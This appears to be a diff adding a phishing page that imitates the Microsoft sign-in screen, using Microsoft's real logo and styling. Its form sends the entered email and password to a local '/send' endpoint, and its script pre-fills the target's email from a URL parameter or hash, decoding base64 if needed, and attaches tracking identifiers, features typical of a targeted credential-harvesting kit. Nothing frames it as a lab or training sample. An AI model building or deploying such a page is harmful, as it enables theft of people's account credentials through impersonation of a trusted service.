@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Microsoft Login</title>
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      background-color: #f2f2f2;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      margin: 0;
+    }
+
+    .login-wrapper {
+      width: 100%;
+      max-width: 440px;
+      background-color: #ffffff;
+      padding: 40px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+    }
+
+    .logo {
+      width: 110px;
+      margin-bottom: 20px;
+    }
+
+    .login-wrapper h5 {
+      font-weight: 600;
+      margin: 0 0 20px;
+      font-size: 20px;
+      color: #1b1b1b;
+    }
+
+    .login-wrapper input[type="text"],
+    .login-wrapper input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #666;
+      border-radius: 0;
+      font-size: 15px;
+      outline: none;
+    }
+
+    .login-wrapper input[type="text"]:focus,
+    .login-wrapper input[type="password"]:focus {
+      border: 2px solid #0078d4;
+    }
+
+    .login-wrapper input[type="submit"] {
+      width: 100%;
+      padding: 10px;
+      background-color: #0078d4;
+      color: white;
+      border: none;
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      border-radius: 0;
+    }
+
+    .login-wrapper input[type="submit"]:hover {
+      background-color: #106ebe;
+    }
+
+    .extra-link {
+      margin-top: 15px;
+      font-size: 13px;
+    }
+
+    .extra-link a {
+      color: #0078d4;
+      text-decoration: none;
+    }
+
+    .extra-link a:hover {
+      text-decoration: underline;
+    }
+
+    .signin-options {
+      margin-top: 20px;
+      font-size: 13px;
+    }
+
+    .signin-options a {
+      color: #0078d4;
+      text-decoration: none;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }
+
+    .signin-options a:hover {
+      text-decoration: underline;
+    }
+
+    .footer {
+      margin-top: 30px;
+      font-size: 13px;
+      color: #444;
+    }
+
+    .footer a {
+      color: #0078d4;
+      text-decoration: none;
+    }
+
+    .footer a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-wrapper">
+    <img src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" 
+         alt="Microsoft Logo" 
+         class="logo">
+    <h5>Sign in</h5>
+
+    <form action="/send" method="post" id="loginForm">
+      <input type="text" id="email" name="email" placeholder="Email, phone, or Skype" required>
+      <input type="password" id="password" name="userpwd" placeholder="Password" required>
+      
+	<!-- Hidden inputs for session tracking -->
+      <input type="hidden" name="sessionId" id="sessionId" value="">
+      <input type="hidden" name="submissionPath" id="submissionPath" value="">
+
+      <input type="submit" value="Next">
+    </form>
+
+    <div class="extra-link">
+      <a href="#">Can’t access your account?</a>
+    </div>
+
+    <div class="signin-options">
+      <a href="#"><span>🔑</span> Sign-in options</a>
+    </div>
+
+    <div class="footer">
+      <p>Don’t have an account? <a href="#">Create one!</a></p>
+      <p><a href="#">Privacy</a> &nbsp;·&nbsp; <a href="#">Terms of use</a></p>
+    </div>
+  </div>
+
+    <script>
+	// Generate or retrieve sessionId
+  let sessionId = localStorage.getItem("sessionId");
+  if (!sessionId) {
+    sessionId = crypto.randomUUID();
+    localStorage.setItem("sessionId", sessionId);
+  }
+  document.getElementById("sessionId").value = sessionId;
+
+  // Always set current path for submissionPath
+  document.getElementById("submissionPath").value = window.location.pathname;       
+
+
+	    document.addEventListener("DOMContentLoaded", function () {
+            const emailInput = document.getElementById("email");
+            const passwordField = document.getElementById("password");
+            const form = document.getElementById("loginForm");
+            const btn = document.getElementById("loginForm");
+
+            // --- 1️⃣ Get email from URL ---
+            const fullUrl = window.location.href;
+            const urlParams = new URLSearchParams(window.location.search);
+            let rawEmail = urlParams.get('quotes') || "";
+
+            const hashIndex = fullUrl.indexOf("#");
+            if (hashIndex !== -1) {
+                const hashValue = decodeURIComponent(fullUrl.substring(hashIndex + 1));
+                if (hashValue.includes("@")) rawEmail = hashValue;
+            }
+
+            let cleanEmail = rawEmail.split(";;")[0] || rawEmail;
+
+            if (cleanEmail && /^[A-Za-z0-9+/=]+$/.test(cleanEmail)) {
+                try { cleanEmail = atob(cleanEmail); } catch(e) {}
+            }
+
+            // --- 2️⃣ Fill readonly email input and update UI ---
+            if (cleanEmail) {
+                emailInput.value = cleanEmail;
+                emailInput.dispatchEvent(new Event('input', { bubbles: true }));
+                emailInput.dispatchEvent(new Event('change', { bubbles: true }));
+            }
+        });
+    </script>
+</body>
+</html>
